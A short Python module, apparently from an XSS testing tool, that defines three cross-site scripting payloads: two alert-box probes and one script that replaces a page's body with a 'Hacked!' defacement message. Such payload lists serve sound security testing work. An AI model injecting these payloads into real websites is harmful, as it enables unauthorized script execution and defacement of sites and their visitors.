#XSS_PAYLOADS = [
#    "<script>alert('test')</script>",
#    "<img src=\"nonexistent.jpg\" onerror=\"alert('XSS')\">",
#    "<script>document.body.innerHTML = '<h1>Hacked!</h1><p>This site has been compromised.</p>';</script>"
#]

XSS_PAYLOADS = {
    "test": "<script>alert('test')</script>",
    "XSS": "<img src=\"nonexistent.jpg\" onerror=\"alert('XSS')\">",
    "Hacked!": "<script>document.body.innerHTML = '<h1>Hacked!</h1><p>This site has been compromised.</p>';</script>"
}

def get_payloads()->dict:
    return XSS_PAYLOADS

